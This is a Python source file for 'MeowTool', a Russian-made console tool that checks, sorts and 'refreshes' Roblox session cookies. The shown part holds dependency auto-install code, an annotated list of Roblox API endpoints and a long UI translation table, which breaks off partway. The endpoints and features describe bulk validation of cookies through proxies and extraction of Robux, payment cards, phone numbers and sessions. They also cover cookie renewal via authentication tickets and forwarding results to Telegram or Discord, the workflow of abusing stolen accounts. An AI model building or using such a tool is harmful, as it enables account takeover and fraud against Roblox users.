import os
import sys
from subprocess   import run
from zipfile      import ZipFile, ZIP_DEFLATED
from copy         import deepcopy
from random       import choice
import asyncio
import webbrowser
from shutil       import move, copyfile
from datetime     import datetime, timedelta
from re           import compile, sub, search
import socket
from msvcrt       import getch

IMPORTS = {
    'tomlkit'         : 'tomlkit==0.13.3',        # 0.13.3
    'requests'        : 'requests==2.32.4',       # 2.32.4
    'socks'           : 'PySocks==1.7.1',         # 1.7.1
    'aiohttp'         : 'aiohttp==3.12.14',       # 3.12.14
    'aiohttp_socks'   : 'aiohttp_socks==0.10.1',  # 0.10.1
    'aiofiles'        : 'aiofiles==24.1.0',       # 24.1.0
    'aiogram'         : 'aiogram==3.21.0',        # 3.21.0
    'discord_webhook' : 'discord-webhook==1.4.1', # 1.4.1
    'fake_useragent'  : 'fake-useragent==2.2.0',  # 2.2.0
    'emoji'           : 'emoji==2.14.1',          # 2.14.1
    'columnar'        : 'columnar==1.4.1',        # 1.4.1
    'colorama'        : 'colorama==0.4.6'         # 0.4.6
}

while True:
    try:
        import colorama; colorama.init()
        sys.stdout.write(f'\n  \033[1m[\033[95m<3\033[0m\033[1m] Заботимся о зависимостях... :3\033[0m\r')
        from tomlkit            import loads, dumps, document, nl, comment, table, TOMLDocument
        from tomlkit.items      import Table, Item
        import requests
        import socks
        from aiohttp            import ClientSession, TCPConnector, ClientOSError, ContentTypeError, ConnectionTimeoutError, ClientConnectorError, ServerDisconnectedError, ClientConnectorDNSError
        from aiohttp_socks      import ProxyConnector, ProxyConnectionError, ProxyTimeoutError
        import aiofiles
        from aiogram            import Bot
        from aiogram.types      import FSInputFile
        from aiogram.enums      import ParseMode
        from aiogram.exceptions import TelegramNetworkError, TelegramUnauthorizedError, TelegramBadRequest
        from discord_webhook    import DiscordWebhook, DiscordEmbed
        # from fake_useragent     import UserAgent; ua = UserAgent()
        from emoji              import replace_emoji
        from columnar           import columnar
        break
    except ModuleNotFoundError as me:
        run([sys.executable, "-m", "pip", "install", IMPORTS[str(me)[17:-1]]])
    except Exception as e:
        sys.stdout.write(f'Неизвестная ошибка: {e} :<\n')
        getch()
        sys.exit()

# MeowTool :3

'''
<|> MAYBE USEFUL INFORMATION

    Roblox API
      [*] AssetType: https://create.roblox.com/docs/reference/engine/enums/AssetType
      
      [*] APIs: https://create.roblox.com/docs/en-us/cloud (left-bottom: Legacy APIs)

        [?] Need cookie:
          [C+] - Yes
          [C-] - No
          [C=] - Yes if (profile == Private) else No

        [?] Methods:
          [G] - GET
          [P] - POST

        [?] {UserId}: User ID (without {})
        
        [?] Flags in APIs:
                ?userId=           (User ID)
          [LIM] &limit=            (maximum items per page)
          [CNT] &count=            (maximum items per page)
          [IPP] &itemsPerPage=     (maximum items per page)
          [CSR] &cursor=           (next page)
          [NSR] &nextCursor=       (next page)
          [ESI] &exclusiveStartId= (next page, ID of the last item)
        
        [C+] [G]             Validity:               https://users.roblox.com/v1/users/authenticated
        [C+] [G]             Main Information:       https://www.roblox.com/my/settings/json
        [C+] [G]             Country Registration:   https://users.roblox.com/v1/users/authenticated/country-code
        [C-] [G]             Registration Date:      https://users.roblox.com/v1/users/{UserId}
        [C+] [G]             Robux:                  https://economy.roblox.com/v1/users/{UserId}/currency
        [C+] [G]             Billing:                https://apis.roblox.com/credit-balance/v1/get-conversion-metadata
        [C+] [G]             Transactions For Year:  https://economy.roblox.com/v2/users/{UserId}/transaction-totals?timeFrame=Year&transactionType=summary
        [C+] [G] [LIM] [CSR] All Transactions:       https://economy.roblox.com/v2/users/{UserId}/transactions?transactionType=2&limit=100
        [C=] [G] [LIM] [CSR] Rap:                    https://inventory.roblox.com/v1/users/{UserId}/assets/collectibles?sortOrder=Asc&limit=100
        [C+] [G]             Cards:                  https://apis.roblox.com/payments-gateway/v1/payment-profiles
        [C=] [G] [CNT] [ESI] Gamepasses:             https://apis.roblox.com/game-passes/v1/users/{UserId}/game-passes?count=100
        [C=] [G] [LIM] [CSR] Badges:                 https://badges.roblox.com/v1/users/{UserId}/badges?limit=100
        [C-] [G] [IPP] [CSR] Favorite Places:        https://games.roblox.com/v2/users/{UserId}/favorite/games?limit=100
        [C=] [G] [LIM] [CSR] Bundles:                https://catalog.roblox.com/v1/users/{UserId}/bundles/1?limit=100
        [C+] [G]             Inventory Privacy:      https://apis.roblox.com/user-settings-api/v1/user-settings/settings-and-options
        [C+] [G]             Trade Privacy:          https://accountsettings.roblox.com/v1/trade-privacy
        [C+] [G]       [NSR] Sessions:               https://apis.roblox.com/token-metadata-service/v1/sessions
        [C+] [G]             Phone:                  https://accountinformation.roblox.com/v1/phone
        [C+] [G]             Verified Age:           https://apis.roblox.com/age-verification-service/v1/age-verification/verified-age
        [C+] [G]             Verified Voice:         https://voice.roblox.com/v1/settings
        [C-] [G]             Friends Count:          https://friends.roblox.com/v1/users/{UserId}/friends/count
        [C-] [G]             Followers Count:        https://friends.roblox.com/v1/users/{UserId}/followers/count
        [C-] [G]             Followings Count:       https://friends.roblox.com/v1/users/{UserId}/followings/count
        [C-] [G]             Roblox Badges:          https://accountinformation.roblox.com/v1/users/{UserId}/roblox-badges
        [C+] [P]             X-CSRF-Token:           https://auth.roblox.com/v2/logout
        [C+] [P]             Authentication Ticket:  https://auth.roblox.com/v1/authentication-ticket
        [C+] [P]             Set Cookie:             https://auth.roblox.com/v1/authentication-ticket/redeem



    Telegram API
      [?] Create a bot: https://t.me/BotFather
    
      [?] Methods:
        [G] - GET
        [P] - POST

      [?] {TOKEN} Bot's token (without {})

      [G] Chat ID with bot: https://api.telegram.org/bot{TOKEN}/getUpdates (message to bot before check)
'''

### Версии

VERSIONS = {
    'MeowTool': 'v2.1.0'
}

### ANSI коды

class ANSI:
    class FG: # text colors
        BLACK       = '\033[30m'
        RED         = '\033[31m' # BAD
        GREEN       = '\033[32m' # GOOD
        YELLOW      = '\033[33m' # UI / WARN
        BLUE        = '\033[34m' # UI
        PURPLE      = '\033[35m' # UI
        CYAN        = '\033[36m' # UI / INFO
        WHITE       = '\033[37m'
        GRAY        = '\033[90m' # UI
        LIGHTRED    = '\033[91m'
        LIGHTGREEN  = '\033[92m'
        LIGHTYELLOW = '\033[93m'
        LIGHTBLUE   = '\033[94m'
        PINK        = '\033[95m' # UI
        LIGHTCYAN   = '\033[96m' # UI
        LIGHTWHITE  = '\033[97m'
    class DECOR: # text decorations
        BOLD            = '\033[1m'
        NOTBOLD         = '\033[2m'
        CURSIVE         = '\033[3m'
        UNDERLINE1      = '\033[4m'  # close to the text
        UNDERLINE2      = '\033[52m' # just below the text
        DOUBLEUNDERLINE = '\033[21m'
        FLASHING1       = '\033[5m'  # [Doesn't Work On Windows 10]
        FLASHING2       = '\033[6m'  #           ^ same ^
        CROSSEDOUT      = '\033[9m'
    # clear colors and decorations
    CLEAR = '\033[0m'

### Переводы

def translateMT(language: str):
    global MT_Invalid_Token_Format, MT_Invalid_URL_Format, MT_Send_Any_Message_To_The_Bot_And_Try_Again, MT_Specify_The_Bot_Token, MT_Specify_The_Chat_ID, MT_Specify_The_Webhook_URL, MT_Following_The_Link, MT_Message_Was_Sent, MT_Enter_A_Bot_Token, MT_Enter_A_Chat_ID, MT_Enter_A_Webhook_URL, MT_Send, MT_You, MT_Results_To_Telegram, MT_Results_To_Discord, MT_Create_A_Telegram_Bot, MT_Search_Chat_ID, MT_Telegram, MT_Discord, MT_Specify, MT_Value_Must_Consist_Of_Digits, MT_Value_Cannot_Be_Empty, MT_Successfully, MT_Unsuccessfully, MT_Possibly_The_Internet_Is_Unstable, MT_Possibly_A_Typo_In_The_Bot_Token, MT_Possibly_A_Typo_In_The_Chat_ID, MT_Unknown_Error, MT_Possibly_A_Typo_In_The_Webhook_URL, MT_Unknown_Server_Response_Code, MT_Bot_Token, MT_Chat_ID, MT_Telegram_Bot, MT_Webhook_URL, MT_Discord_Webhook, MT_Outputs, MT_Spent, MT_Transactions, MT_Status, MT_Play_The_Sound_At_The_End_Of_The_Work, MT_Show_Amount_Of_Lines_In_Files, MT_Count_Robux_In_Total, MT_Cookie, MT_Format, MT_Enable_At_Least_One_Place_To_Start_Analysis, MT_Number_Of_Threads_For_Transaction_Analysis, MT_Output_Filename, MT_Name_Output_File_The_Same_As_Input_File, MT_Transaction_With_This_Name_Already_Exists, MT_Enter_A_Transaction_Name, MT_Add_A_Transaction, MT_Ignore, MT_Ignore_All, MT_Do_Not_Ignore_All, MT_Important, MT_Ignore_List, MT_Discover_New_Names_For_Ignore_List, MT_Save_Old_Versions, MT_Updates, MT_Yes, MT_No, MT_Use_SSL, MT_Max_Indentation, MT_No_Indentation, MT_Transaction_Analysis, MT_Save_All_Places_In_One_File, MT_Save_Places_To_Different_Files, MT_Add_Nick_After_Cookie_In_Folder_Names, MT_Add_Robux_After_Place_In_File_Names, MT_Indentation_Option , MT_Item, MT_Price, MT_Date, MT_Open_MeowTool_On_GitHub, MT_You_Are_Using_Version_Of_Program, MT_Open_A_Topic_On_LolzTeam, MT_Open_The_Showcase_On_YouTube, MT_Open_PM_With_Developer_In_Telegram, MT_Open_Latest_Changes, MT_About_The_Program, MT_Check_For_Updates, MT_No_Cookies_Found, MT_All_Cookies_Were_Invalid, MT_Number_Of_Threads_For_Valid_Checker, MT_Number_Of_Threads_For_Main_Checker, MT_Incorrect_Number_Of_Threads_500, MT_Enter_Number_Of_Threads, MT_First_We_Check_For_Valid, MT_Valid, MT_Invalid, MT_First_Check_All_Cookies_For_Valid, MT_No_Cookie_Was_Found, MT_No_Proxy_Was_Found, MT_Auto_Protocol, MT_Use_Proxy, MT_Auto_Protocol_If_Not_Specified, MT_Any, MT_Key_To_Continue, MT_File_Was_Not_Created, MT_File_Is_Missing, MT_Incorrect_Cookies_Removed, MT_Error, MT_50_Cookies_In_Once, MT_50_Cookies_In_60_Seconds, MT_Send_Some_Requests_Through_RoProxy, MT_Rate_Limit_Has_Been_Reached, MT_Checker, MT_Proxy, MT_The_Name_Cannot_Be_Empty, MT_Do_Not_Use_Characters_Such_As, MT_Enter_A_New_Title, MT_Console_Title, MT_Show_Place_ID_Next_To_The_Name, MT_Disable_Warnings_For_Links, MT_Disable_Warnings_For_Dangerous_Actions, MT_Show_Cookie, MT_Data, MT_Find, MT_Save_Invalid_Cookies, MT_Save_Cookies_Added_Manually, MT_History_Manual, MT_Save_Cookies_Checked_By_Checker, MT_History_Checker, MT_Cookie_Control_Panel, MT_Start_Refresher, MT_Wait, MT_Can_Run, MT_Do_You_Sure, MT_I_Am_Sure, MT_Not_Yet, MT_Reset_To_Default_Settings, MT_Reload_Config, MT_New_Cookie, MT_In, MT_Enter_A_Cookie, MT_Incorrect_Cookie, MT_Invalid_Cookie, MT_Single_Mode, MT_Mass_Mode, MT_Could_Not_Connect_To_The_API, MT_Trying_To_Connect_Again, MT_Bind, MT_Show_Lable_MeowTool, MT_Show_Lable_by_h1kken, MT_The_Parameter_Can_Only_Be_A_Number, MT_Add_A_Parameter, MT_Sort, MT_Sorting, MT_The_Place_Has_No_Gamepasses_And_Badges, MT_Custom_Places, MT_Enable_All, MT_Disable_All, MT_Id, MT_Nickname, MT_Name, MT_Link, MT_Duplicated_Cookies_Removed, MT_Unique_Cookies_Found, MT_Successfully_Uploaded_In, MT_Place_ID, MT_Place_Name, MT_Place_Link, MT_Gamepasses, MT_Badges, MT_Remove_Emojies, MT_Remove_Round_Brackets, MT_Remove_Square_Brackets, MT_Upload_All_Info_Gamepasses_And_Badges, MT_Enable_Something_To_Start_Checking, MT_Save_Without_Protocol, MT_Save_In, MT_The_Data_Is_Saved_In, MT_Incorrect_Length_Of_ID_50, MT_Incorrect_Length_Of_Parameter_20, MT_Incorrect_Length_Of_Name_50, MT_Incorrect_Length_Of_Config_Name_50, MT_Gamepass_With_This_Name_Already_Exists, MT_Add_A_Gamepass_Name, MT_Found_Data_On, MT_The_Place_Has_No_Gamepasses, MT_The_Place_Has_No_Badges, MT_Gamepasses_Parser_From_The_Place, MT_Badges_Parser_From_The_Place, MT_Misc, MT_Seconds, MT_Waiting_Time, MT_Output_Total, MT_Found, MT_Lines, MT_Start_Sorting, MT_Enter_The_Parameter_Value, MT_Enter_The_Waiting_Time, MT_Enter_The_Gamepass_Name, MT_Enter_The_Place_ID, MT_Enter_The_Bundle_ID, MT_Gamepasses, MT_Badges, MT_Fix_Console, MT_Settings, MT_General, MT_Main, MT_Places, MT_Language, MT_Configs, MT_Check, MT_Save, MT_Auto_Save_Changes, MT_Update_List, MT_Back, MT_Close_Program, MT_Add_A_Bundle_By_ID, MT_Add_A_Place_By_ID, MT_Enter_Something, MT_Create_Config, MT_Cancel, MT_Load_On_Launch, MT_Load, MT_File_Location, MT_Rename, MT_Delete, MT_Enter_Name_For_New_Config, MT_Enter_New_Name_For_Config, MT_Enter_New_Filename, MT_User_Agreement, MT_User_Agreement_1, MT_User_Agreement_2, MT_User_Agreement_3, MT_User_Agreement_4, MT_Parameter_With_This_Value_Already_Exists, MT_Bundle_With_This_ID_Already_Exists, MT_Place_With_This_ID_Already_Exists, MT_Incorrent_Bundle_ID, MT_Incorrent_Place_ID, MT_Incorrect_File_Name, MT_File_With_This_Name_Already_Exists, MT_Incorrect_Waiting_Time, MT_Incorrect_Value, MT_Of, MT_Start_Checking_File, MT_Checking_Complete, MT_Sorting_File, MT_Sorting_Complete, MT_Press_Any_Key_To_Continue, MT_Press_Enter_To_Continue, MT_Request, MT_Everything_Or_Something_Is_On, MT_Everything_Is_On_Or_Off, MT_Total, MT_Roblox, MT_Checker, MT_Cookie_Sorter, MT_Cookie_Checker, MT_Cookie_Refresher, MT_Beta, MT_Only_Goodness, MT_Hi
    match str(language).upper():
        case 'EN':
            MT_Invalid_Token_Format                        = 'Invalid token format'
            MT_Invalid_URL_Format                          = 'Invalid URL format'
            MT_Send_Any_Message_To_The_Bot_And_Try_Again   = 'Send any message to the bot and try again'
            MT_Specify_The_Bot_Token                       = 'Specify the bot token'
            MT_Specify_The_Chat_ID                         = 'Specify the chat ID'
            MT_Specify_The_Webhook_URL                     = 'Specify the webhook URL'
            MT_Following_The_Link                          = 'Following the link'
            MT_Message_Was_Sent                            = 'Message was sent'
            MT_Enter_A_Bot_Token                           = 'Enter a bot token'
            MT_Enter_A_Chat_ID                             = 'Enter a chat ID'
            MT_Enter_A_Webhook_URL                         = 'Enter a webhook URL'
            MT_Send                                        = 'Send', 'Send', 'Sent'
            MT_You                                         = 'You', 'You', 'Are you'
            MT_Results_To_Telegram                         = 'Results to Telegram'
            MT_Results_To_Discord                          = 'Results to Discord'
            MT_Create_A_Telegram_Bot                       = 'Create a telegram bot'
            MT_Search_Chat_ID                              = 'Search chat ID'
            MT_Telegram                                    = 'Telegram', 'TG'
            MT_Discord                                     = 'Discord', 'DS'
            MT_Specify                                     = 'Specify'
            MT_Value_Must_Consist_Of_Digits                = 'Value must consist of digits'
            MT_Value_Cannot_Be_Empty                       = 'Value can not be empty'
            MT_Successfully                                = 'Successfully'
            MT_Unsuccessfully                              = 'Unsuccessfully'
            MT_Possibly_The_Internet_Is_Unstable           = 'Possibly the internet is unstable'
            MT_Possibly_A_Typo_In_The_Bot_Token            = 'Possibly a typo in the bot token'
            MT_Possibly_A_Typo_In_The_Chat_ID              = 'Possibly a typo in the chat ID'
            MT_Unknown_Error                               = 'Unknown error'
            MT_Possibly_A_Typo_In_The_Webhook_URL          = 'Possibly a typo in the webhook URL'
            MT_Unknown_Server_Response_Code                = 'Unknown server response code'
            MT_Bot_Token                                   = 'Bot token'
            MT_Chat_ID                                     = 'Chat ID', 'chat ID'
            MT_Telegram_Bot                                = 'Telegram bot'
            MT_Webhook_URL                                 = 'Webhook URL', 'webhook URL'
            MT_Discord_Webhook                             = 'Discord webhook'
            MT_Outputs                                     = 'Outputs'
            MT_Spent                                       = 'Spent'
            MT_Transactions                                = 'Transactions'
            MT_Status                                      = 'Status'
            MT_Play_The_Sound_At_The_End_Of_The_Work       = 'Play the sound at the end of the work'
            MT_Show_Amount_Of_Lines_In_Files               = 'Show amount of lines in files'
            MT_Count_Robux_In_Total                        = 'Count robux in total'
            MT_Cookie                                      = 'Cookie'
            MT_Format                                      = 'Format'
            MT_Enable_At_Least_One_Place_To_Start_Analysis = 'Enable at least one place to start analysis'
            MT_Number_Of_Threads_For_Transaction_Analysis  = 'Number of threads for transaction analysis'
            MT_Output_Filename                             = 'Output filename'
            MT_Name_Output_File_The_Same_As_Input_File     = 'Name output file the same as input file'
            MT_Transaction_With_This_Name_Already_Exists   = 'Transaction with this name already exists'
            MT_Enter_A_Transaction_Name                    = 'Enter a transaction name'
            MT_Add_A_Transaction                           = 'Add a transaction'
            MT_Ignore                                      = 'Ignore'
            MT_Ignore_All                                  = 'Ignore all'
            MT_Do_Not_Ignore_All                           = 'Do not ignore all'
            MT_Important                                   = 'Important'
            MT_Ignore_List                                 = 'Ignore list'
            MT_Discover_New_Names_For_Ignore_List          = 'Discover new names for ignore list'
            MT_Save_Old_Versions                           = 'Save old versions'
            MT_Updates                                     = 'Updates'
            MT_Yes                                         = 'Yes'
            MT_No                                          = 'No'
            MT_Use_SSL                                     = 'Use SSL'
            MT_Max_Indentation                             = 'Max indentation'
            MT_No_Indentation                              = 'No indentation'
            MT_Transaction_Analysis                        = 'Transaction analysis'
            MT_Save_All_Places_In_One_File                 = 'Save all places in one file'
            MT_Save_Places_To_Different_Files              = 'Save places to different files'
            MT_Add_Nick_After_Cookie_In_Folder_Names       = 'Add nick after cookie in folder names'
            MT_Add_Robux_After_Place_In_File_Names         = 'Add robux after place in file names'
            MT_Indentation_Option                          = 'Indentation option'
            MT_Item                                        = 'Item'
            MT_Price                                       = 'Price'
            MT_Date                                        = 'Date'
            MT_You_Are_Using_Version_Of_Program            = f'You are using {VERSIONS['MeowTool']} version of program'
            MT_Open_Latest_Changes                         = 'Open latest changes'
            MT_Open_MeowTool_On_GitHub                     = 'Open MeowTool on GitHub'
            MT_Open_A_Topic_On_LolzTeam                    = 'Open a topic on LolzTeam'
            MT_Open_The_Showcase_On_YouTube                = 'Open the showcase on YouTube'
            MT_Open_PM_With_Developer_In_Telegram          = 'Open PM with developer in Telegram'
            MT_About_The_Program                           = 'About the program'
            MT_Check_For_Updates                           = 'Check for updates'
            MT_No_Cookies_Found                            = 'No cookies found'
            MT_All_Cookies_Were_Invalid                    = 'All cookies were invalid'
            MT_Number_Of_Threads_For_Valid_Checker         = 'Number of threads for valid checker'
            MT_Number_Of_Threads_For_Main_Checker          = 'Number of threads for main checker'
            MT_Incorrect_Number_Of_Threads_500             = 'Do not exceed the 500 thread limit'
            MT_Enter_Number_Of_Threads                     = 'Enter number of threads'
            MT_First_We_Check_For_Valid                    = 'First we check for valid'
            MT_Valid                                       = 'Valid'
            MT_Invalid                                     = 'Invalid'
            MT_First_Check_All_Cookies_For_Valid           = 'First check all cookies for valid'
            MT_No_Cookie_Was_Found                         = 'No cookie was found, the check was canceled'
            MT_No_Proxy_Was_Found                          = 'No proxy was found, the check was canceled'
            MT_Auto_Protocol                               = 'Auto protocol'
            MT_Use_Proxy                                   = 'Use proxy'
            MT_Auto_Protocol_If_Not_Specified              = 'The protocol, if it isn\'t specified in file'
            MT_Any                                         = 'Any'
            MT_Key_To_Continue                             = 'Key to continue'
            MT_File_Was_Not_Created                        = 'File was not created'
            MT_File_Is_Missing                             = 'File is missing somewhere, strange'
            MT_Incorrect_Cookies_Removed                   = 'Incorrect cookies removed'
            MT_Error                                       = 'Error'
            MT_50_Cookies_In_Once                          = '50 cookies in once'
            MT_50_Cookies_In_60_Seconds                    = '50 cookies in 60 seconds'
            MT_Send_Some_Requests_Through_RoProxy          = 'Send some requests through RoProxy'
            MT_Rate_Limit_Has_Been_Reached                 = 'Rate-Limit has been reached'
            MT_Checker                                     = 'Checker'
            MT_Proxy                                       = 'Proxy'
            MT_The_Name_Cannot_Be_Empty                    = 'The name cannot be empty'
            MT_Do_Not_Use_Characters_Such_As               = 'Do not use characters such as'
            MT_Enter_A_New_Title                           = 'Enter a new title'
            MT_Console_Title                               = 'Console title'
            MT_Show_Place_ID_Next_To_The_Name              = 'Show place ID next to the name'
            MT_Disable_Warnings_For_Links                  = 'Disable warnings for links'
            MT_Disable_Warnings_For_Dangerous_Actions      = 'Disable warnings for dangerous actions'
            MT_Show_Cookie                                 = 'Show cookie'
            MT_Data                                        = 'Data'
            MT_Find                                        = 'Find'
            MT_Save_Invalid_Cookies                        = 'Save invalid cookies'
            MT_Save_Cookies_Added_Manually                 = 'Save cookies added manually'
            MT_History_Manual                              = 'History (manual)'
            MT_Save_Cookies_Checked_By_Checker             = 'Save cookies checked by checker'
            MT_History_Checker                             = 'History (checker)'
            MT_Cookie_Control_Panel                        = 'Cookie control panel'
            MT_Start_Refresher                             = 'Start refresher'
            MT_Wait                                        = 'Wait', 'Waiting'
            MT_Can_Run                                     = 'Can run'
            MT_Do_You_Sure                                 = 'Do you sure?'
            MT_I_Am_Sure                                   = 'I am sure'
            MT_Not_Yet                                     = 'Not yet'
            MT_Reset_To_Default_Settings                   = 'Reset to default settings'
            MT_Reload_Config                               = 'Reload config'
            MT_New_Cookie                                  = 'New cookie'
            MT_In                                          = 'In'
            MT_Enter_A_Cookie                              = 'Enter a cookie', 'Enter a cookie'
            MT_Incorrect_Cookie                            = 'Incorrect cookie'
            MT_Invalid_Cookie                              = 'Invalid cookie'
            MT_Single_Mode                                 = 'Single mode'
            MT_Mass_Mode                                   = 'Mass mode'
            MT_Could_Not_Connect_To_The_API                = 'Couldn\'t connect to the API'
            MT_Trying_To_Connect_Again                     = 'Trying to connect again'
            MT_Bind                                        = 'Bind'
            MT_Show_Lable_MeowTool                         = 'Show lable \'MeowTool\''
            MT_Show_Lable_by_h1kken                        = 'Show lable \'by h1kken :3\''
            MT_The_Parameter_Can_Only_Be_A_Number          = 'The parameter can only be a number'
            MT_Add_A_Parameter                             = 'Add a parameter'
            MT_Sort                                        = 'Sort'
            MT_Sorting                                     = 'Sorting'
            MT_The_Place_Has_No_Gamepasses_And_Badges      = 'The place has no gamepasses and badges'
            MT_Custom_Places                               = 'Custom places'
            MT_Enable_All                                  = 'Enable all'
            MT_Disable_All                                 = 'Disable all'
            MT_Id                                          = 'ID'
            MT_Nickname                                    = 'Nickname'
            MT_Name                                        = 'Name'
            MT_Link                                        = 'Link'
            MT_Duplicated_Cookies_Removed                  = 'Duplicated cookies removed'
            MT_Unique_Cookies_Found                        = 'Unique cookies found'
            MT_Successfully_Uploaded_In                    = 'Successfully uploaded in'
            MT_Place_ID                                    = 'Place\'s ID'
            MT_Place_Name                                  = 'Place\'s name'
            MT_Place_Link                                  = 'Place\'s link'
            MT_Gamepasses                                  = 'Gamepasses'
            MT_Badges                                      = 'Badges'
            MT_Remove_Emojies                              = 'Remove emojies from the name'
            MT_Remove_Round_Brackets                       = 'Remove (and what is inside them) from the name'
            MT_Remove_Square_Brackets                      = 'Remove [and what is inside them] from the name'
            MT_Upload_All_Info_Gamepasses_And_Badges       = 'Upload all information about gamepasses and badges from the program'
            MT_Enable_Something_To_Start_Checking          = 'Enable something to start checking'
            MT_Save_Without_Protocol                       = 'Save without protocol'
            MT_Save_In                                     = 'Save in'
            MT_The_Data_Is_Saved_In                        = 'The data is saved in'
            MT_Incorrect_Length_Of_ID_50                   = 'ID length cannot exceed 50 characters'
            MT_Incorrect_Length_Of_Parameter_20            = 'Parameter length cannot exceed 20 numbers'
            MT_Incorrect_Length_Of_Name_50                 = 'Name length cannot exceed 50 characters'
            MT_Incorrect_Length_Of_Config_Name_50          = 'Config name length cannot exceed 50 characters'
            MT_Gamepass_With_This_Name_Already_Exists      = 'Gamepass with this name already exists'
            MT_Add_A_Gamepass_Name                         = 'Add a gamepasse\'s name'
            MT_Found_Data_On                               = 'Found data on'
            MT_The_Place_Has_No_Gamepasses                 = 'The place has no gamepasses'
            MT_The_Place_Has_No_Badges                     = 'The place has no badges'
            MT_Gamepasses_Parser_From_The_Place            = 'Gamepasses parser from the place'
            MT_Badges_Parser_From_The_Place                = 'Badges parser from the place'
            MT_Misc                                        = 'Misc'
            MT_Seconds                                     = 'sec'
            MT_Waiting_Time                                = 'Waiting time'
            MT_Output_Total                                = 'Output total'
            MT_Found                                       = 'Found'
            MT_Lines                                       = 'Lines'
            MT_Start_Sorting                               = 'Start sorting'
            MT_Enter_The_Parameter_Value                   = 'Enter the parameter value'
            MT_Enter_The_Waiting_Time                      = 'Enter the waiting time in seconds'
            MT_Enter_The_Gamepass_Name                     = 'Enter the gamepasse\'s name'
            MT_Enter_The_Place_ID                          = 'Enter the place\'s ID'
            MT_Enter_The_Bundle_ID                         = 'Enter the bundle\'s ID'
            MT_Gamepasses                                  = 'Gamepasses'
            MT_Badges                                      = 'Badges'
            MT_Fix_Console                                 = 'Fix console'
            MT_Settings                                    = 'Settings'
            MT_General                                     = 'General'
            MT_Main                                        = 'Main'
            MT_Places                                      = 'Places'
            MT_Language                                    = 'Language'
            MT_Configs                                     = 'Configs'
            MT_Check                                       = 'Check'
            MT_Save                                        = 'Save', 'Save'
            MT_Auto_Save_Changes                           = 'Auto. save changes'
            MT_Update_List                                 = 'Update list'
            MT_Back                                        = 'Back'
            MT_Close_Program                               = 'Close the program'
            MT_Add_A_Bundle_By_ID                          = 'Add a bundle by ID'
            MT_Add_A_Place_By_ID                           = 'Add a place by ID'
            MT_Enter_Something                             = 'Enter something'
            MT_Create_Config                               = 'Create config'
            MT_Cancel                                      = 'Cancel'
            MT_Load_On_Launch                              = 'Load on launch'
            MT_Load                                        = 'Load'
            MT_File_Location                               = 'File location'
            MT_Rename                                      = 'Rename'
            MT_Delete                                      = 'Delete'
            MT_Enter_Name_For_New_Config                   = 'Enter the name for new config'
            MT_Enter_New_Name_For_Config                   = 'Enter a new name for config'
            MT_Enter_New_Filename                          = 'Enter new filename'
            MT_Parameter_With_This_Value_Already_Exists    = 'Parameter with this value already exists'
            MT_Bundle_With_This_ID_Already_Exists          = 'Bundle with this ID already exists'
            MT_Place_With_This_ID_Already_Exists           = 'Place with this ID already exists'
            MT_Incorrent_Bundle_ID                         = 'Incorrect bundle\'s ID'
            MT_Incorrent_Place_ID                          = 'Incorrect place\'s ID'
            MT_Incorrect_File_Name                         = 'Incorrect filename'
            MT_File_With_This_Name_Already_Exists          = 'File with this name already exists'
            MT_Incorrect_Waiting_Time                      = 'The waiting time cannot be more than 3600 seconds'
            MT_Incorrect_Value                             = 'Incorrect value'
            MT_Of                                          = 'of'
            MT_Start_Checking_File                         = 'Checking the file'
            MT_Checking_Complete                           = 'Checking complete'
            MT_Sorting_File                                = 'Sorting file'
            MT_Sorting_Complete                            = 'Sorting complete'
            MT_Press_Any_Key_To_Continue                   = 'Press any key to continue'
            MT_Press_Enter_To_Continue                     = 'Press Enter to continue'
            MT_Request                                     = 'Request'
            MT_Everything_Or_Something_Is_On               = 'everything or something is on, always'
            MT_Everything_Is_On_Or_Off                     = 'everything is on or off, always'
            MT_Total                                       = 'T', 'O', 'T', 'A', 'L'
            MT_Roblox                                      = 'Roblox'
            MT_Cookie_Sorter                               = 'Cookie sorter'
            MT_Cookie_Checker                              = 'Cookie checker'
            MT_Cookie_Refresher                            = 'Cookie refresher'
            MT_Beta                                        = '[BETA]'
            MT_Only_Goodness                               = 'Only goodness'
            MT_Hi                                          = 'Hi'
        case _: # 'RU'
            MT_Invalid_Token_Format                        = 'Недопустимый формат токена'
            MT_Invalid_URL_Format                          = 'Недопустимый формат URL'
            MT_Send_Any_Message_To_The_Bot_And_Try_Again   = 'Отправь любое сообщение боту и попробуй снова'
            MT_Specify_The_Bot_Token                       = 'Укажи токен бота'
            MT_Specify_The_Chat_ID                         = 'Укажи ID чата'
            MT_Specify_The_Webhook_URL                     = 'Укажи URL вебхука'
            MT_Following_The_Link                          = 'Переход по ссылке'
            MT_Message_Was_Sent                            = 'Сообщение было отправлено'
            MT_Enter_A_Bot_Token                           = 'Введи токен бота'
            MT_Enter_A_Chat_ID                             = 'Введи ID чата'
            MT_Enter_A_Webhook_URL                         = 'Введи URL вебхука'
            MT_Send                                        = 'Отправлять', 'Отправляю', 'Отправил'
            MT_You                                         = 'Ты', 'Тебе', 'Ты'
            MT_Results_To_Telegram                         = 'результаты в Телеграм'
            MT_Results_To_Discord                          = 'результаты в Дискорд'
            MT_Create_A_Telegram_Bot                       = 'Создать телеграм бота'
            MT_Search_Chat_ID                              = 'Найти ID чата'
            MT_Telegram                                    = 'Телеграм', 'ТГ'
            MT_Discord                                     = 'Дискорд', 'ДС'
            MT_Specify                                     = 'Указать'
            MT_Value_Must_Consist_Of_Digits                = 'Значение должно состоять из цифр'
            MT_Value_Cannot_Be_Empty                       = 'Значение не может быть пустым'
            MT_Successfully                                = 'Удачно'
            MT_Unsuccessfully                              = 'Неудачно'
            MT_Possibly_The_Internet_Is_Unstable           = 'Возможно интернет нестабилен'
            MT_Possibly_A_Typo_In_The_Bot_Token            = 'Возможно опечатка в токене бота'
            MT_Possibly_A_Typo_In_The_Chat_ID              = 'Возможно опечатка в ID чата'
            MT_Unknown_Error                               = 'Неизвестная ошибка'
            MT_Possibly_A_Typo_In_The_Webhook_URL          = 'Возможно опечатка в URL вебхука'
            MT_Unknown_Server_Response_Code                = 'Неизвестный код ответа сервера'
            MT_Bot_Token                                   = 'Токен бота'
            MT_Chat_ID                                     = 'ID чата', 'ID чата'
            MT_Telegram_Bot                                = 'Телеграм бот'
            MT_Discord_Webhook                             = 'Дискорд вебхук'
            MT_Webhook_URL                                 = 'URL вебхука', 'URL вебхука'
            MT_Outputs                                     = 'Выводы'
            MT_Spent                                       = 'Потрачено'
            MT_Transactions                                = 'Транзакций'
            MT_Status                                      = 'Статус'
